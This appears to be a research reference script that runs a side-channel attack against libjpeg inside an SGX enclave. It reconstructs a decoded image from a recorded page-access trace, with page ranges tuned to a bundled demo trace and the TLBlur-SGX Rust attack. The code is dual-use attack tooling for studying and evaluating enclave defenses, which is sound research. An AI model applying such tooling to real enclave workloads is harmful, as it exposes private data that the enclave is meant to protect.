
"""
JPEG Page-Trace Reconstruction Attack (Automated)
------------------------------------------------

Purpose:
    Reference script for the automated JPEG page-trace reconstruction attack.
    Configures the JPEG state machine, processes a VCD trace, and outputs:
      - A reconstructed image (PGM/PPM/PNG)
      - A JSON file with per-block data counts
      - A scaled PNG preview for quick inspection

Workflow:
    - Loads a VCD trace of libjpeg execution.
    - Sets up a JpegAttackConfig with page ranges tuned for the demo trace.
    - Calls attack_jpeg_vcd() to automatically process the trace and reconstruct the image.
    - Uses save_attack_outputs() to write the image, JSON, and preview files.
    - Prints a summary of the attack and output locations.

Use case:
    Best for batch processing, reference results, and when you want a simple, automated workflow.
"""

from pathlib import Path

from sgxtrace import attack_jpeg_vcd, save_attack_outputs
from sgxtrace.jpeg import JpegAttackConfig

TRACE_PATH = "traces/trace_libjpeg.vcd"
OUTPUT_DIR = Path("output")
OUTPUT_IMAGE = OUTPUT_DIR / "jpeg_reconstruction.pgm"
RAW_JSON = OUTPUT_DIR / "jpeg_reconstruction.json"
PREVIEW_PNG = OUTPUT_DIR / "jpeg_reconstruction_preview.png"
COLOR_MODE = False  # True for RGB, False for grayscale.


def build_default_config(*, color: bool = COLOR_MODE) -> JpegAttackConfig:
    """Return the page ranges tuned for the bundled JPEG demo trace.

    The DATA_COUNT range is set to the wide [150, 4340) span used by the
    TLBlur-SGX Rust reference attack. With this range the Python output
    is byte-identical to the Rust BMP for ~97% of pixels (Pearson 0.99).
    A narrower range like {154, 155, 156} also produces a recognisable
    image but undercounts blocks because pages 150-153 and 157-4339 carry
    additional data accesses that should also count. 
    """
    return JpegAttackConfig(
        start_range=range(54, 55),
        next_row_range=range(44, 45),
        start_row_range=range(58, 59),
        pre_idct_slow_range=range(56, 57),
        idct_slow_range=range(62, 64),
        data_count_range_no_aexnotify=range(150, 4340),
        data_count_range_aexnotify=range(150, 4335),
        data_count_pages=None,
        num_colors=3 if color else 1,
        aexnotify=False,
    )


def run_jpeg_attack(trace_path: str = TRACE_PATH) -> None:
    """Run the JPEG reconstruction attack and write the resulting files."""
    print("--- JPEG RECONSTRUCTION ATTACK ---")
    print(f"Loading trace: {trace_path}")

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    config = build_default_config()
    result = attack_jpeg_vcd(trace_path, config)

    save_attack_outputs(
        result,
        image_path=OUTPUT_IMAGE,
        raw_json_path=RAW_JSON,
        preview_path=PREVIEW_PNG,
        preview_scale=16,
    )

    width, height = result.reconstruction.reconstructed_size()
    print("Attack finished successfully.")
    print(f"Processed pages: {result.processed_pages}")
    print(f"Final state:     {result.final_state.value}")
    print(f"Image size:      {width} x {height} blocks")
    print(f"Channels:        {config.num_colors}")
    print(f"Image written:   {OUTPUT_IMAGE}")
    print(f"Preview written: {PREVIEW_PNG}")
    print(f"Raw JSON:        {RAW_JSON}")
    print(f"Min data count:  {result.reconstruction.min_data}")
    print(f"Max data count:  {result.reconstruction.max_data}")


if __name__ == "__main__":
    run_jpeg_attack()